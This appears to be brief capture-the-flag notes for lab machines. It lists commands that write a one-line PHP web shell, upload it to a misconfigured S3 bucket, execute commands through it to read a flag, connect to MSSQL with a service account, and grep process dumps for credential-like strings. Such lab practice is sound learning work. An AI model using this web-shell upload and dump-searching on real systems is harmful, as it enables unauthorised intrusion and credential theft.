### Commands

```linux
The /etc/hosts file is used to resolve a hostname into an IP address
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
```

```bash
crunch 2 2 >words.txt
cat /var/www/flag.txt
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt
```

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.128.157 -windows-auth
strings -e l 2556.dmp | grep -E "(.*?)_(.*?)_"
strings 300.dmp | grep -oP '.+\.\w+\:[1-9]\d+'
```
